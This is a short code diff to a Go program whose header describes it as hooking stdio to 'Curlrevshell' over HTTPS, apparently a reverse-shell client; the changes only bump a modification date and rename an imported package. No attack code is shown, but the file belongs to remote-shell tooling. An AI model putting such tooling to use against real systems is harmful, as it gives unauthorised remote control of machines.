@@ -7,7 +7,7 @@ package main
  * Hook up stdio to Curlrevshell via HTTPS
  * By J. Stuart McMurray
  * Created 20250802
- * Last Modified 20250806
+ * Last Modified 20250906
  */
 
 import (
@@ -18,7 +18,7 @@ import (
 	"syscall"
 	"time"
 
-	_ "github.com/magisterquis/sneaky_remap_preview"
+	_ "github.com/magisterquis/sneaky_remap"
 )
 
 // Compile-time config.
